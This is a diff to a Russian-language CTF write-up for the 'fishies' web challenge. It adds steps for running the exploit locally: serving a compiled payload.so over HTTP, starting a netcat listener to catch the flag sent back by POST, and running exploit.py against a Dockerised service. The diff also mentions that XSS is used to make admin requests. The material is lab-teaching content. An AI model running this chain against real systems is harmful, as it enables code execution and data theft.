@@ -192,6 +192,33 @@ python3 scripts/exploit.py \
 
 Дополнительные материалы: [evidence/notes.md](evidence/notes.md) с граблями в HTML/JSON, [evidence/audit-puppeteer-pp.md](evidence/audit-puppeteer-pp.md) с экспериментами на Puppeteer и [evidence/run-log.txt](evidence/run-log.txt) с замаскированным успешным прогоном.
 
+### Локальное воспроизведение четырёх посещений
+
+В репозитории есть оригинальные [`assets/compose.yaml`](assets/compose.yaml), [`assets/Dockerfile`](assets/Dockerfile) и [`assets/flag.txt`](assets/flag.txt). В последнем записана **заглушка**, а не флаг соревнования. Сборка Docker Compose в этом аудите **не выполнялась**, поэтому следующие команды — проверяемый по исходникам порядок запуска, а не фиктивный отчёт об успешном контейнерном тесте.
+
+Сам `exploit.py` не запускает HTTP-раздачу библиотеки и сетевой слушатель. Для самостоятельного локального запуска нужны четыре терминала и **IPv4-адрес хоста Docker, доступный из контейнера**. Нельзя указывать `127.0.0.1`, который внутри контейнера относится к самому контейнеру:
+
+```bash
+# Терминал 1: сервис на 127.0.0.1:8080
+cd ctf/platypwn2026/web/fishies/assets
+docker compose up --build
+
+# Терминал 2: собрать .so и раздавать по HTTP
+cd ctf/platypwn2026/web/fishies
+python3 scripts/exploit.py --host http://127.0.0.1:8080 \
+  --lhost <DOCKER_HOST_IPV4> --lport 4466 --setup-only
+python3 -m http.server 8000 --bind 0.0.0.0 --directory /tmp/fishies-exploit/www
+
+# Терминал 3: дополнительный канал для POST с флагом
+nc -lvnp 4466
+
+# Терминал 4: исходный сценарий из четырёх проверок ботом
+python3 scripts/exploit.py --host http://127.0.0.1:8080 \
+  --lhost <DOCKER_HOST_IPV4> --lport 4466 --http-port 8000
+```
+
+`--setup-only` на самом деле тоже компилирует библиотеку и печатает внедряемый ASCII-код. HTTP-сервер должен продолжать работать, пока исполняется эксплойт. Код `pwn.c` использует `inet_addr(LHOST)`, поэтому `--lhost` должен быть **буквальным IPv4**, а не доменным именем. Параметр `--host` — URL сервиса, к которому подключается управляющий Python-скрипт. Контрольные точки: сначала HTTP 200 на `/static/dl/payload.so`, затем локальная заглушка в `/static/dl/flag.txt`.
+
 ## 9. Тупики и причины
 
 - HttpOnly-cookie бота читать не нужно: XSS сразу делает админские запросы.
